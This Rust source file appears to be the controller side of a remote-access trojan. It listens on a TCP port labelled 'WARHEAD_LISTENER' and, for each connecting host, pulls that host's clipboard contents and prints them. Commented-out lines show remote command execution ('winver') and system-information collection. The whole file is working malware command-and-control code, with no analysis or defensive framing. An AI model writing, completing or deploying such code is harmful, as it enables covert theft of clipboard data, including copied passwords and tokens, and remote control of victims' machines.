use std::thread::sleep;
use tokio::net::{TcpListener, TcpStream};
use tokio::spawn;
use Redox::schema::sys::SysInfo;
use Redox::utils::network::{receive, request_clipboard, request_sys_info};

#[tokio::main]
async fn main() {
    some().await.unwrap();
}

const WARHEAD_LISTENER: &str = "127.0.0.1:3000";
const CONTROLER_CONNECT: &str = "127.0.0.1:3001";

async fn some() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind(&WARHEAD_LISTENER).await?;
    loop {
        let (mut socket, _) = listener.accept().await?;
        println!("Accepted connection from: {}", socket.peer_addr()?);
        spawn(async move {
            handle_client(&mut socket).await;
        });
    }
    // Ok(())
}

async fn handle_client(socket: &mut TcpStream) {
    // send_command(socket, "winver").await.unwrap();
    // request_sys_info(socket).await.unwrap();
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    request_clipboard(socket).await.unwrap();
    let data = receive(socket).await.unwrap();
    
    if data.datatype == "1" { println!("{}", String::from_utf8(data.data).unwrap()); }
    
}